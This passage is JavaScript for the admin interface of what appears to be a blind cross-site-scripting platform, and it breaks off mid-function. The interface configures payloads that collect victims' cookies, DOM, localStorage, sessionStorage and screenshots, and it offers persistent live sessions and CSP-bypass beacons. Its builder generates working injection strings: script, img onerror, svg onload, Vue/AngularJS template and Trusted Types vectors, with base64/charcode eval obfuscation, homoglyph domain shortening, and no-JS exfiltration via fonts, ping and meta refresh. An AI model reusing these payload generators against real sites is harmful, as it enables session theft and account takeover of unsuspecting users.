window.EZ = window.EZ || {};
(function (EZ) {
  "use strict";

  var dom = EZ.dom, util = EZ.util;
  var DASH = "-";

  var COLLECT = [
    { key: "uri", label: "URL" },
    { key: "ip", label: "IP address" },
    { key: "referer", label: "Referer" },
    { key: "useragent", label: "User-agent" },
    { key: "cookies", label: "Cookies" },
    { key: "dom", label: "DOM" },
    { key: "localstorage", label: "localStorage" },
    { key: "sessionstorage", label: "sessionStorage" },
    { key: "csp", label: "CSP" },
    { key: "screenshot", label: "Screenshot" }
  ];

  var globals = null;

  var LIST_PER_PAGE = 25;
  var listState = { page: 1, user: "" };
  var userMap = null;

  function canManageUsers() { return util.can("user.manage"); }
  function isAdmin() { return util.can("payload.viewall"); }

  function el(id) { return document.getElementById(id); }
  function root() { return dom.qs("[data-payloads-root]"); }
  function setTitle(text) {
    var t = dom.qs("#screen-payloads .pagetitle");
    if (t) { t.textContent = text; }
  }

  function loadGlobals() {
    if (!util.can("settings.manage")) { globals = {}; return Promise.resolve(globals); }
    return EZ.api.get("/settings", { noGlobalError: true }).then(function (res) {
      var s = (res.data && res.data.settings) || {};
      globals = {
        collect: s.collect || {}, persistent: !!s.persistent, spider: !!s.spider, beacon: !!s.beacon_fallback,
        allow_customjs: s.allow_customjs !== false, allow_pages: s.allow_pages !== false, allow_filters: s.allow_filters !== false,
        allow_extensions: s.allow_extensions !== false,
        globalExts: (s.extensions || []).map(Number)
      };
      return globals;
    }).catch(function () { globals = {}; return globals; });
  }
  var payloadGates = null;
  function gateOn(key) {
    return !(payloadGates && payloadGates[key] === false);
  }
  function collectOffGlobally(key) {
    return !!(payloadGates && payloadGates.collect && payloadGates.collect[key] === false);
  }
  function userMayBehaviour(key) {
    return util.can("payload.behaviour") && util.can("payload.behaviour." + key);
  }
  function featureOff(key) {
    return !gateOn(key) || !userMayBehaviour(key);
  }

  function listCols() { return canManageUsers() ? 5 : 4; }

  function loadList(r) {
    setTitle("Payloads");
    listState = { page: 1, user: "" };
    var admin = canManageUsers();
    var ownerHead = admin ? "<th>Owner</th>" : "";
    var ownerFilter = admin
      ? '<select class="input" id="pl-owner-filter" style="max-width:200px" aria-label="Filter by user"><option value="">All users</option></select>'
      : "";
    r.innerHTML =
      '<div class="toolbar">' +
        '<span class="faint pl-lede" style="font-size:var(--text-sm);flex:1 1 220px;min-width:0">Every payload is served at its own domain/path. Pick one to configure what it collects.</span>' +
        ownerFilter +
        (util.can("payload.create")
          ? '<button class="btn btn--primary" id="pl-create" type="button">Create payload</button>'
          : "") +
      "</div>" +
      '<div class="tablewrap"><table class="data">' +
        "<thead><tr><th>Payload</th>" + ownerHead + "<th>Pages</th><th>Filters</th><th>Mode</th></tr></thead>" +
        '<tbody id="pl-tbody"><tr><td colspan="' + listCols() + '" class="faint">' + EZ.ui.loading() + '</td></tr></tbody>' +
      "</table></div>" +
      '<div class="pagination" id="pl-pagination"></div>';

    var create = el("pl-create");
    if (create) {
      dom.on(create, "click", openCreateModal);
    }

    if (admin) {
      ensureUserMap().then(function () {
        fillOwnerFilter();
        var sel = el("pl-owner-filter");
        if (sel) {
          dom.on(sel, "change", function () { listState.user = sel.value; listState.page = 1; loadPage(); });
        }
        loadPage();
      });
    } else {
      loadPage();
    }
  }

  function ensureUserMap() {
    if (userMap) { return Promise.resolve(userMap); }
    return EZ.api.get("/users?all=1").then(function (res) {
      userMap = {};
      (res.data || []).forEach(function (u) { userMap[u.id] = u.username; });
      return userMap;
    }).catch(function () { userMap = {}; return userMap; });
  }

  function fillOwnerFilter() {
    var sel = el("pl-owner-filter");
    if (!sel || !userMap) { return; }
    var opts = '<option value="">All users</option>';
    Object.keys(userMap).forEach(function (uid) {
      opts += '<option value="' + util.escapeHtml(String(uid)) + '"' +
        (String(uid) === String(listState.user) ? " selected" : "") + ">" +
        util.escapeHtml(userMap[uid]) + "</option>";
    });
    sel.innerHTML = opts;
  }

  function fillCreateOwner() {
    var sel = el("pl-new-owner");
    if (!sel || !userMap) { return; }
    var selfId = EZ.state.user && EZ.state.user.id;
    var opts = "";
    Object.keys(userMap).forEach(function (uid) {
      opts += '<option value="' + util.escapeHtml(String(uid)) + '"' +
        (String(uid) === String(selfId) ? " selected" : "") + ">" +
        util.escapeHtml(userMap[uid]) + "</option>";
    });
    sel.innerHTML = opts;
  }

  function ownerName(p) {
    var uid = p.user_id;
    if (userMap && userMap[uid]) { return userMap[uid]; }
    return "#" + uid;
  }

  function loadPage() {
    var tb = el("pl-tbody");
    if (tb) { tb.innerHTML = '<tr><td colspan="' + listCols() + '" class="faint">' + EZ.ui.loading() + '</td></tr>'; }
    var q = "?page=" + listState.page + "&per_page=" + LIST_PER_PAGE +
      (canManageUsers() && listState.user ? "&user=" + encodeURIComponent(listState.user) : "");
    EZ.api.get("/payloads" + q).then(function (res) {
      paintList(res.data || []);
      paintListPagination((res.meta && res.meta.pagination) || {});
    }).catch(function () {
      if (tb) { tb.innerHTML = '<tr><td colspan="' + listCols() + '" class="faint">Could not load payloads.</td></tr>'; }
    });
  }

  function paintListPagination(meta) {
    var box = el("pl-pagination");
    if (!box) { return; }
    EZ.ui.renderPager(box, meta, function (p) { listState.page = p; loadPage(); });
  }

  function modeCell(p) {
    var tags = [];
    if (p.persistent) { tags.push('<span class="tag tag--muted">Persistent</span>'); }
    if (Number(p.spider) === 1) { tags.push('<span class="tag">Spider</span>'); }
    else if (Number(p.spider) === 2) { tags.push('<span class="tag">Spider (recursive)</span>'); }
    return tags.length ? '<span class="tagrow">' + tags.join("") + "</span>" : '<span class="faint">' + DASH + "</span>";
  }

  function paintList(rows) {
    var tb = el("pl-tbody");
    if (!tb) { return; }
    var admin = canManageUsers();
    if (!rows.length) {
      tb.innerHTML = '<tr><td colspan="' + listCols() + '" class="faint">' +
        (admin && listState.user ? "No payloads for this user." : "No payloads yet.") + "</td></tr>";
      return;
    }
    tb.innerHTML = rows.map(function (p) {
      var name = '<span class="mono">' + util.escapeHtml(p.identifier) + "</span>";
      var ownerCell = admin ? ('<td class="faint">' + util.escapeHtml(ownerName(p)) + "</td>") : "";
      return '<tr data-pl-row="' + p.id + '">' +
        '<td class="cell-strong">' + name + "</td>" +
        ownerCell +
        '<td class="faint">' + util.escapeHtml(String(p.pages_count || 0)) + "</td>" +
        '<td class="faint">' + util.escapeHtml(String(p.filters_count || 0)) + "</td>" +
        "<td>" + modeCell(p) + "</td>" +
        "</tr>";
    }).join("");

    dom.qsa("[data-pl-row]", tb).forEach(function (tr) {
      dom.on(tr, "click", function () {
        EZ.router.navigate("payloads", { id: tr.getAttribute("data-pl-row") });
      });
    });
  }

  function setModalTitle(text) {
    var t = el("payload-modal-title");
    if (t) { t.textContent = text; }
  }

  function pcMsg(text, isError) {
    var box = el("pc-msg");
    if (!box) { return; }
    if (text) {
      box.hidden = false;
      box.textContent = text;
      box.classList.remove("msg--error", "msg--ok");
      box.classList.add(isError ? "msg--error" : "msg--ok");
    } else {
      box.hidden = true;
      box.textContent = "";
    }
  }

  function openCreateModal() {
    if (!util.can("payload.create")) { return; }
    var body = el("payload-modal-body");
    if (!body) { return; }
    body.innerHTML =
      (isAdmin()
        ? '<div class="field"><label class="field-label" for="pl-new-owner">Owner</label>' +
            '<select class="input" id="pl-new-owner" aria-label="Owner for the new payload"></select></div>'
        : "") +
      '<div class="field"' + (isAdmin() ? ' style="margin-top:var(--space-md)"' : "") + '>' +
        '<label class="field-label" for="pl-new">Domain or domain/path</label>' +
        '<input class="input mono" id="pl-new" type="text" placeholder="domain or domain/path" autocapitalize="none" spellcheck="false"></div>' +
      '<p class="field-hint" id="pc-msg" hidden></p>' +
      '<div style="display:flex;gap:var(--space-sm);justify-content:flex-end;margin-top:var(--space-lg)">' +
        '<button class="btn btn--ghost" type="button" data-close-modal>Cancel</button>' +
        '<button class="btn btn--primary" type="button" id="pl-create-submit">Create payload</button>' +
      "</div>";

    setModalTitle("Create payload");

    if (isAdmin()) {
      ensureUserMap().then(fillCreateOwner);
    }

    dom.on(el("pl-create-submit"), "click", createPayload);
    dom.on(el("pl-new"), "keydown", function (e) { if (e.key === "Enter") { createPayload(); } });

    EZ.ui.openModal("payload-modal");
    var input = el("pl-new");
    if (input) { input.focus(); }
  }

  function createPayload() {
    var input = el("pl-new");
    if (!input) { return; }
    var value = input.value.trim();
    if (!value) { pcMsg("Enter a domain or domain/path.", true); input.focus(); return; }
    var btn = el("pl-create-submit");
    if (btn) { btn.disabled = true; }
    pcMsg("");
    var payloadBody = { payload: value };
    var ownerSel = el("pl-new-owner");
    if (isAdmin() && ownerSel && ownerSel.value) { payloadBody.user = ownerSel.value; }
    EZ.api.post("/payloads", payloadBody, { noGlobalError: true }).then(function (res) {
      var created = res.data || {};
      EZ.ui.closeModalById("payload-modal");
      EZ.ui.toast("Payload created.", "success");
      if (created.id) { EZ.router.navigate("payloads", { id: created.id }); }
      else { loadList(root()); }
    }).catch(function (err) {
      if (btn) { btn.disabled = false; }
      pcMsg((err && err.message) || "Could not create the payload.", true);
    });
  }

  function loadEditor(r, id) {
    setTitle("Payload");
    r.innerHTML = '<div class="card">' + EZ.ui.loading() + '</div>';
    loadGlobals().then(function () {
      return EZ.api.get("/payloads/get/" + encodeURIComponent(id));
    }).then(function (res) {
      renderEditor(r, res.data || {});
    }).catch(function () {
      r.innerHTML = '<div class="card"><p class="field-hint">Could not load this payload.</p></div>';
    });
  }

  var GLOBAL_ON_TIP = "Enabled for every payload by an administrator";
  var SETTINGS_OFF_MSG = "Disabled by an administrator";
  var PERMISSION_OFF_MSG = "Not included in your permissions";

  function behaviourReason(key) {
    if (!gateOn(key)) { return SETTINGS_OFF_MSG; }
    return PERMISSION_OFF_MSG;
  }

  function offBlur(innerHtml, reason) {
    return '<div class="jsoff"><div class="jsoff__content">' + innerHtml + "</div>" +
      '<div class="jsoff__note"><span>' + (reason || SETTINGS_OFF_MSG) + "</span></div></div>";
  }
  function withGlobalTip(controlHtml, off, reason) {
    if (!off) { return controlHtml; }
    return '<span class="tip">' + controlHtml +
      '<span class="tip__bubble" role="tooltip">' + (reason || SETTINGS_OFF_MSG) + "</span></span>";
  }

  function collectCard(p) {
    var items = COLLECT.map(function (opt) {
      var off = collectOffGlobally(opt.key);
      var on = !!(p.collect && p.collect[opt.key]) && !off;
      var sw = '<label class="switch"><input type="checkbox" data-field="collect" data-autosave-builder="payloadCollect" data-collect-opt="' + opt.key + '"' +
        (on ? " checked" : "") + (off ? " disabled" : "") + '><span class="switch__track"></span></label>';
      return '<div class="toggle-item"><div class="toggle-item__label">' + util.escapeHtml(opt.label) + "</div>" +
        withGlobalTip(sw, off) + "</div>";
    }).join("");
    return '<div class="subcard"><h3>Collect</h3><div class="togglegrid">' + items + "</div></div>";
  }

  function behaviourCard(p) {
    var persOff = featureOff("persistent");
    var spiderOff = featureOff("spider");
    var beaconOff = featureOff("beacon");
    var persOn = !!p.persistent && !persOff;
    var beaconOn = !!p.beacon && !beaconOff;
    var spider = spiderOff ? "0" : String(Number(p.spider) || 0);
    function spiderOpt(v, text) {
      return '<option value="' + v + '"' + (spider === v ? " selected" : "") + ">" + text + "</option>";
    }
    var persSw = '<label class="switch"><input type="checkbox" data-field="persistent"' + (persOn ? " checked" : "") + (persOff ? " disabled" : "") +
      '><span class="switch__track"></span></label>';
    var spiderSel = '<select class="input" id="pl-spider" data-field="spider"' + (spiderOff ? " disabled" : "") + ' style="width:auto;min-width:160px">' +
      spiderOpt("0", "Off") +
      spiderOpt("1", "Spider linked pages (one level)") +
      spiderOpt("2", "Spider linked pages (recursive)") +
      "</select>";
    var beaconSw = '<label class="switch"><input type="checkbox" data-field="beacon"' + (beaconOn ? " checked" : "") + (beaconOff ? " disabled" : "") +
      '><span class="switch__track"></span></label>';
    return '<div class="subcard"><h3>Behaviour</h3><div class="stack">' +
      '<div class="toggle-item"><div><div class="toggle-item__label">Persistent mode</div>' +
        '<div class="toggle-item__sub">Keep a live session + console</div></div>' +
        withGlobalTip(persSw, persOff, behaviourReason("persistent")) + "</div>" +
      '<div class="toggle-item"><div><div class="toggle-item__label">Page spider</div>' +
        '<div class="toggle-item__sub">Crawl same-origin linked pages</div></div>' +
        withGlobalTip(spiderSel, spiderOff, behaviourReason("spider")) + "</div>" +
      '<div class="toggle-item"><div><div class="toggle-item__label">CSP-bypass beacons</div>' +
        '<div class="toggle-item__sub">Fallback channels when a direct callback is blocked</div></div>' +
        withGlobalTip(beaconSw, beaconOff, behaviourReason("beacon")) + "</div>" +
      "</div></div>";
  }

  function jsPlaceholder(after) {
    return "// runs " + (after ? "after" : "before") + " the report is sent,\n" +
      "// inside a function that's called for you\nalert(1);";
  }
  function customjsCard(p, which) {
    var after = which === "after";
    var id = after ? "pl-customjs2" : "pl-customjs";
    var field = after ? "customjs2" : "customjs";
    var val = after ? p.customjs2 : p.customjs;
    var off = featureOff("customjs");
    var ta = '<textarea class="input mono" id="' + id + '" data-field="' + field +
      '" rows="8" spellcheck="false"' + (off ? " disabled" : "") + ' placeholder="' + util.escapeHtml(jsPlaceholder(after)) + '">' +
      util.escapeHtml(val || "") + "</textarea>";
    return '<div class="subcard"><h3>Custom JS - ' + (after ? "after send" : "before send") + "</h3>" +
      (off ? offBlur(ta, behaviourReason("customjs")) : ta) + "</div>";
  }

  function extSkeletonRow() {
    return '<div class="extpick"><div class="extpick__main">' +
      '<div class="extpick__name">Extension</div>' +
      '<div class="extpick__desc">Managed by an administrator</div></div>' +
      '<span class="switch"><span class="switch__track"></span></span></div>';
  }
  function extensionsCard() {
    var off = featureOff("extensions");
    var body = off
      ? offBlur('<div class="extpick-list">' + extSkeletonRow() + extSkeletonRow() + extSkeletonRow() + "</div>", behaviourReason("extensions"))
      : '<div data-ext-list>' + EZ.ui.loading() + "</div>";
    return '<div class="subcard subcard--wide"><h3>Extensions</h3>' + body + "</div>";
  }

  var PB_TYPES = [
    { key: "script",   label: "Script" },
    { key: "image",    label: "Image" },
    { key: "svg",      label: "SVG" },
    { key: "details",  label: "details" },
    { key: "jquery",   label: "jQuery" },
    { key: "vue",      label: "Vue" },
    { key: "link",     label: "Link URI" },
    { key: "createel", label: "createElement" },
    { key: "plain",    label: "Plain JS" },
    { key: "inline",   label: "Inline loader" },
    { key: "tt",       label: "Trusted Types" }
  ];
  var PB_OPTS = {
    inline:   ["breakout", "noSpaces", "openTag"],
    script:   ["breakout", "noSpaces", "openTag"],
    image:    ["breakout", "noSpaces", "openTag", "b64", "charcode"],
    svg:      ["breakout", "noSpaces", "openTag", "b64", "charcode"],
    details:  ["breakout", "noSpaces", "openTag", "b64", "charcode"],
    link:     ["b64", "charcode"],
    createel: ["b64", "charcode"],
    plain:    ["b64", "charcode"],
    vue:      ["vue2"]
  };
  var ENC_NOTE = "Encoded vectors run through eval: they need 'unsafe-eval' and throw when Trusted Types are enforced.";
  var TT_NOTE = "Creates a Trusted Types policy named 'ez'. If the trusted-types directive lists policy names, rename it to one of those.";

  var SB_MAP = {
    "ij": "ĳ", "bar": "㍴", "ov": "㍵", "na": "㎁", "ma": "㎃", "ka": "㎄", "kb": "㎅", "mb": "㎆", "gb": "㎇", "cal": "㎈", "kcal": "㎉", "pf": "㎊", "nf": "㎋", "mg": "㎎", "kg": "㎏", "hz": "㎐", "khz": "㎑", "mhz": "㎒", "ghz": "㎓", "thz": "㎔", "ml": "㎖", "dl": "㎗", "kl": "㎘", "fm": "㎙", "nm": "㎚", "mm": "㎜", "cm": "㎝", "km": "㎞", "mm2": "㎟", "cm2": "㎠", "m2": "㎡", "km2": "㎢", "mm3": "㎣", "cm3": "㎤", "m3": "㎥", "km3": "㎦", "pa": "㎩", "kpa": "㎪", "mpa": "㎫", "gpa": "㎬", "rad": "㎭", "ps": "㎰", "ns": "㎱", "ms": "㎳", "pv": "㎴", "nv": "㎵", "mv": "㎷", "kv": "㎸", "pw": "㎺", "nw": "㎻", "mw": "㎽", "kw": "㎾", "bq": "㏃", "cc": "㏄", "cd": "㏅", "db": "㏈", "gy": "㏉", "ha": "㏊", "hp": "㏋", "in": "㏌", "kk": "㏍", "kt": "㏏", "lm": "㏐", "ln": "㏑", "log": "㏒", "lx": "㏓", "mil": "㏕", "mol": "㏖", "ph": "㏗", "pm": "㏘", "ppm": "㏙", "pr": "㏚", "sr": "㏛", "sv": "㏜", "wb": "㏝", "no": "№", "tm": "™", "tel": "℡", "rs": "₨", "sm": "℠", "gal": "㏿", "ff": "ﬀ", "fi": "ﬁ", "fl": "ﬂ", "ffi": "ﬃ", "ffl": "ﬄ", "st": "ﬅ", "dm": "㍷", "dm2": "㍸", "dm3": "㍹", "iu": "㍺", "pc": "㍶", "hg": "㋌", "erg": "㋍", "ev": "㋎", "ltd": "㋏", "hpa": "㍱", "da": "㍲", "pte": "㉐", "ix": "ⅸ", "ii": "ⅱ", "iii": "ⅲ", "iv": "ⅳ", "xi": "Ⅺ", "xii": "Ⅻ", "vi": "ⅵ", "vii": "ⅶ", "viii": "ⅷ", "nj": "Ǌ", "dz": "Ǳ", "lj": "Ǉ", "10": "⑩", "11": "⑪", "12": "⑫", "13": "⑬", "14": "⑭", "15": "⑮", "16": "⑯", "17": "⑰", "18": "⑱", "19": "⑲", "20": "⑳", "21": "㉑", "22": "㉒", "23": "㉓", "24": "㉔", "25": "㉕", "26": "㉖", "27": "㉗", "28": "㉘", "29": "㉙", "30": "㉚", "31": "㉛", "32": "㉜", "33": "㉝", "34": "㉞", "35": "㉟", "36": "㊱", "37": "㊲", "38": "㊳", "39": "㊴", "40": "㊵", "41": "㊶", "42": "㊷", "43": "㊸", "44": "㊹", "45": "㊺", "46": "㊻", "47": "㊼", "48": "㊽", "49": "㊾", "50": "㊿", "au": "㍳", "fax": "℻", "wz": "🄮", "hv": "🅊", "sd": "🅌", "ss": "🅍", "ppv": "🅎", "wc": "🅏", "mc": "🅪", "md": "🅫", "mr": "🅬", "dj": "🆐"
  };
  var SB_KEYS = Object.keys(SB_MAP).sort(function (a, b) { return b.length - a.length; });
  function shortboostHost(host) {
    for (var i = 0; i < SB_KEYS.length; i++) {
      host = host.replace(new RegExp(SB_KEYS[i], "g"), SB_MAP[SB_KEYS[i]]);
    }
    return host;
  }
  function shortboostDomain(d) {
    var slash = d.indexOf("/");
    if (slash === -1) { return shortboostHost(d); }
    return shortboostHost(d.slice(0, slash)) + d.slice(slash);
  }

  function encJs(js, o) {
    if (o.b64) {
      try { return "eval(atob('" + btoa(js) + "'))"; } catch (e) {}
    }
    if (o.b64 || o.charcode) {
      var codes = [];
      for (var i = 0; i < js.length; i++) { codes.push(js.charCodeAt(i)); }
      return "eval(String.fromCharCode(" + codes.join(",") + "))";
    }
    return js;
  }

  function buildSnippet(type, o, d) {
    if (o.shortboost) { d = shortboostDomain(d); }
    var S = "</" + "script>";
    var bo = o.breakout ? "\">" : "";
    var tail = (o.breakout && o.openTag) ? "<x=\"" : "";
    var sep = o.noSpaces ? "/" : " ";
    var enc = !!(o.b64 || o.charcode);
    var imp = encJs("import('//" + d + "')", o);
    switch (type) {
      case "script":
        return bo + "<script" + sep + "src=//" + d + ">" + S + tail;
      case "image":
        return bo + "<img" + sep + "src" + sep + "onerror=" + imp + ">" + tail;
      case "svg":
        return bo + "<svg" + sep + "onload=" + imp + ">" + tail;
      case "details":
        return bo + "<details" + sep + "open" + sep + "ontoggle=" + imp + ">" + tail;
      case "jquery":   return "$.getScript(\"//" + d + "\")";
      case "vue":      return o.vue2 ? "{{constructor.constructor('import(\"//" + d + "\")')()}}" : "{{_openBlock.constructor('import(\"//" + d + "\")')()}}";
      case "link":     return "javascript:" + imp;
      case "createel":
        return enc
          ? "javascript:" + encJs("var a=document.createElement('script');a.src='//" + d + "';document.body.appendChild(a)", o)
          : "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'//" + d + "\\';document.body.appendChild(a)')";
      case "plain":    return encJs("document.head.appendChild(Object.assign(document.createElement('script'),{src:'//" + d + "'}))", o) + ";";
      case "tt":
        return "var s=document.createElement('script');s.src=window.trustedTypes?trustedTypes.createPolicy('ez',{createScriptURL:function(u){return u}}).createScriptURL('//" + d + "'):'//" + d + "';document.head.appendChild(s);";
      case "inline":
        return bo + "<img" + (o.noSpaces ? "/" : " ") + "src" + (o.noSpaces ? "/" : " ") +
          "onerror=\"fetch('//" + d + "').then(r=>r.text()).then(t=>document.head.append(Object.assign(document.createElement('script'),{text:t})))\">" + tail;
    }
    return "";
  }

  var NOJS_TYPES = [
    { key: "img-src",      label: "img-src",      char: "i", el: ["img", "src"] },
    { key: "style-src",    label: "style-src",    char: "s", el: ["link", "href", "rel=stylesheet"] },
    { key: "media-src",    label: "media-src",    char: "m", el: ["audio", "src", "preload=auto"] },
    { key: "font-src",     label: "font-src",     char: "f", special: "font" },
    { key: "frame-src",    label: "frame-src",    char: "r", el: ["iframe", "src"] },
    { key: "object-src",   label: "object-src",   char: "o", el: ["object", "data"] },
    { key: "manifest-src", label: "manifest-src", char: "n", el: ["link", "href", "rel=manifest"] },
    { key: "prefetch",     label: "prefetch",     char: "p", el: ["link", "href", "rel=preload", "as=image"] },
    { key: "connect-src",  label: "connect-src",  char: "c", special: "ping", note: "needs a click" },
    { key: "navigation",   label: "navigation",   char: "v", special: "meta", note: "navigates the page away" },
    { key: "preload",      label: "preload",      char: "l", el: ["link", "href", "rel=preload", "as=image"] },
    { key: "form-action",  label: "form-action",  char: "k", special: "form", note: "needs a click" }
  ];
  var NOJS_BY_KEY = {};
  NOJS_TYPES.forEach(function (t) { NOJS_BY_KEY[t.key] = t; });

  function buildNojsSnippet(key, o, d) {
    var t = NOJS_BY_KEY[key] || NOJS_TYPES[0];
    var dd = o.shortboost ? shortboostDomain(d) : d;
    var url = "//" + dd + (dd.indexOf("/") === -1 ? "/" : "") + "*" + t.char;
    var bo = o.breakout ? "\">" : "";
    var tail = (o.breakout && o.openTag) ? "<x=\"" : "";
    if (t.special === "font") {
      return bo + "<style>@font-face{font-family:ezp;src:url(" + url + ")}html{font-family:ezp}</style>" + tail;
    }
    if (t.special === "meta") {
      return bo + "<meta http-equiv=\"refresh\" content=\"0;url=" + url + "\">" + tail;
    }
    var val = o.noSpaces ? url : "\"" + url + "\"";
    if (t.special === "ping") {
      return bo + "<a href=\"#\" ping=" + val + ">link</a>" + tail;
    }
    if (t.special === "form") {
      return bo + "<form action=\"//" + dd + (dd.indexOf("/") === -1 ? "/" : "") + "*" + t.char + "\" method=\"get\"><button type=\"submit\">Send</button></form>" + tail;
    }
    var sep = o.noSpaces ? "/" : " ";
    var head = [t.el[0]].concat(t.el.slice(2)).join(sep);
    return bo + "<" + head + sep + t.el[1] + "=" + val + ">" + tail;
  }

  function nojsApplies(key) {
    var t = NOJS_BY_KEY[key];
    if (t && (t.special === "font" || t.special === "meta")) { return ["breakout", "openTag"]; }
    return ["breakout", "openTag", "noSpaces"];
  }

  function copyCard(p) {
    var d = p.identifier;
    var testerUrl = "//" + d + (d.indexOf("/") === -1 ? "/" : "") + "*test";
    var jsBtns = PB_TYPES.map(function (t, i) {
      return '<button type="button" data-pb-type="' + t.key + '" data-pb-mode="js" aria-pressed="' + (i === 0 ? "true" : "false") + '">' + t.label + "</button>";
    }).join("");
    var njBtns = NOJS_TYPES.map(function (t, i) {
      return '<button type="button" data-pb-type="' + t.key + '" data-pb-mode="nojs" hidden aria-pressed="' + (i === 0 ? "true" : "false") + '">' + t.label + "</button>";
    }).join("");
    var optDefs = [
      ["breakout", "Break out of attribute (<span class=\"mono\">&quot;&gt;</span>)"],
      ["openTag",  "Append opening tag (<span class=\"mono\">&lt;x=&quot;</span>)"],
      ["noSpaces", "No spaces (slash separators)"],
      ["vue2",     "Vue 2 / AngularJS (default is Vue 3)"],
      ["b64",      "Base64-encode the JS"],
      ["charcode", "Char-code encode the JS"],
      ["shortboost", "shortboost"]
    ];
    var optBoxes = optDefs.map(function (o) {
      return '<label class="checkitem" data-pb-opt="' + o[0] + '" hidden><input type="checkbox" data-pb-in="' + o[0] + '"> ' + o[1] + "</label>";
    }).join("");
    return '<div class="card">' +
      '<div class="card__head"><h2 class="card__title">Payload examples</h2>' +
        '<div class="pbuilder__head-actions">' +
          '<button class="link" type="button" id="pb-autopick">Auto-pick</button>' +
          '<a class="link" href="' + util.escapeHtml(testerUrl) + '" target="_blank" rel="noopener">Tester</a>' +
        "</div>" +
      "</div>" +
      '<div class="pbuilder">' +
        '<div class="pbuilder__modes" role="tablist" aria-label="Injection mode" data-pb-modes>' +
          '<button type="button" class="pbuilder__mode" data-pb-mode-btn="js" aria-pressed="true">' +
            '<span class="pbuilder__mode-t">Run JS</span>' +
            '<span class="pbuilder__mode-s">Runs the payload as a script (needs script-src).</span></button>' +
          '<button type="button" class="pbuilder__mode" data-pb-mode-btn="nojs" aria-pressed="false">' +
            '<span class="pbuilder__mode-t">No-JS probe</span>' +
            '<span class="pbuilder__mode-s">No script. Pings via another open CSP directive.</span></button>' +
        "</div>" +
        '<div class="segmented pbuilder__types" role="group" aria-label="Injection vector" data-pb-types>' + jsBtns + njBtns + "</div>" +
        '<div class="pbuilder__opts" data-pb-opts>' + optBoxes + "</div>" +
        '<div class="copyfield">' +
          '<input class="input mono" id="pb-out" readonly spellcheck="false" value="' + util.escapeHtml(buildSnippet("script", {}, d)) + '">' +
          EZ.ui.copyBtn("#pb-out") +
        "</div>" +
        '<p class="field-hint" id="pb-note" hidden></p>' +
      "</div>" +
      "</div>";
  }

  function bindBuilder(p) {
    var root = dom.qs(".pbuilder");
    if (!root) { return; }
    var d = p.identifier;
    var host = d.split("/")[0];
    var canBoost = shortboostDomain(d) !== d;
    var state = { nojs: false, type: "script", opts: {} };
    var out = el("pb-out"), note = el("pb-note");

    function recompute() {
      if (!out) { return; }
      if (state.nojs) {
        out.value = buildNojsSnippet(state.type, state.opts, d);
        var t = NOJS_BY_KEY[state.type];
        if (note) {
          if (t && t.note) { note.textContent = "⚠ " + t.note; note.hidden = false; }
          else { note.hidden = true; }
        }
      } else {
        out.value = buildSnippet(state.type, state.opts, d);
        var encOn = (state.opts.b64 || state.opts.charcode) && (PB_OPTS[state.type] || []).indexOf("b64") !== -1;
        var msg = state.type === "tt" ? TT_NOTE : (encOn ? ENC_NOTE : "");
        if (note) { note.textContent = msg ? "⚠ " + msg : ""; note.hidden = !msg; }
      }
    }
    function applicable() { return state.nojs ? nojsApplies(state.type) : (PB_OPTS[state.type] || []); }
    function syncOpts() {
      var applies = applicable();
      dom.qsa("[data-pb-opt]", root).forEach(function (lbl) {
        var key = lbl.getAttribute("data-pb-opt");
        if (key === "shortboost") { lbl.hidden = !canBoost; return; }
        lbl.hidden = applies.indexOf(key) === -1;
      });
      var openTagIn = root.querySelector('[data-pb-in="openTag"]');
      if (openTagIn) {
        openTagIn.disabled = !state.opts.breakout;
        if (!state.opts.breakout && (openTagIn.checked || state.opts.openTag)) {
          openTagIn.checked = false; state.opts.openTag = false;
        }
      }
    }
    function showButtons() {
      dom.qsa("[data-pb-type]", root).forEach(function (b) {
        b.hidden = b.getAttribute("data-pb-mode") !== (state.nojs ? "nojs" : "js");
      });
    }
    function pressType() {
      dom.qsa("[data-pb-type]", root).forEach(function (b) {
        var active = b.getAttribute("data-pb-mode") === (state.nojs ? "nojs" : "js") &&
          b.getAttribute("data-pb-type") === state.type;
        b.setAttribute("aria-pressed", String(active));
      });
    }
    function pressMode() {
      dom.qsa("[data-pb-mode-btn]", root).forEach(function (b) {
        b.setAttribute("aria-pressed", String((b.getAttribute("data-pb-mode-btn") === "nojs") === state.nojs));
      });
    }
    function setMode(nojs, type) {
      state.nojs = !!nojs;
      state.type = type || (state.nojs ? NOJS_TYPES[0].key : "script");
      pressMode(); showButtons(); pressType(); syncOpts(); recompute();
    }

    dom.qsa("[data-pb-mode-btn]", root).forEach(function (b) {
      dom.on(b, "click", function () { setMode(b.getAttribute("data-pb-mode-btn") === "nojs"); });
    });
    dom.qsa("[data-pb-type]", root).forEach(function (b) {
      dom.on(b, "click", function () {
        state.type = b.getAttribute("data-pb-type");
        pressType(); syncOpts(); recompute();
      });
    });
    dom.qsa("[data-pb-in]", root).forEach(function (c) {
      dom.on(c, "change", function () {
        var key = c.getAttribute("data-pb-in");
        state.opts[key] = c.checked;
        if (c.checked && (key === "b64" || key === "charcode")) {
          var other = key === "b64" ? "charcode" : "b64";
          var otherIn = root.querySelector('[data-pb-in="' + other + '"]');
          state.opts[other] = false;
          if (otherIn) { otherIn.checked = false; }
        }
        syncOpts(); recompute();
      });
    });

    var autopick = el("pb-autopick");
    if (autopick) {
      dom.on(autopick, "click", function () {
        var body = el("csp-modal-body");
        if (!body) { return; }
        body.innerHTML =
          '<p class="field-hint" style="margin-top:0">Paste the target page’s Content-Security-Policy headers or meta tag (one per line). It works out whether your script loads, otherwise the best open no-JS directive, and flags known bypasses.</p>' +
          '<textarea class="input mono" id="csp-input" rows="4" spellcheck="false" placeholder="content-security-policy: default-src ‘self’; ..."></textarea>' +
          '<div id="csp-result" hidden></div>' +
          '<div style="display:flex;gap:var(--space-sm);justify-content:flex-end;margin-top:var(--space-lg)">' +
            '<button class="btn btn--ghost" type="button" data-close-modal>Cancel</button>' +
            '<button class="btn btn--primary" type="button" id="csp-apply" disabled>Open vector</button>' +
          "</div>";
        var input = el("csp-input"), result = el("csp-result"), apply = el("csp-apply");
        var pick = null;

        function render() {
          var text = input.value.trim();
          if (!text) { result.hidden = true; apply.disabled = true; pick = null; return; }
          var a = EZ.csp.analyze(text, host);
          if (!a.policies) { result.hidden = true; apply.disabled = true; pick = null; return; }
          var html = EZ.csp.verdictHtml(a, host);
          if (a.script !== "blocked") {
            pick = { nojs: false, type: a.script === "inline" ? "inline" : "script" };
            if (!a.connectOk) {
              html += a.imgOk
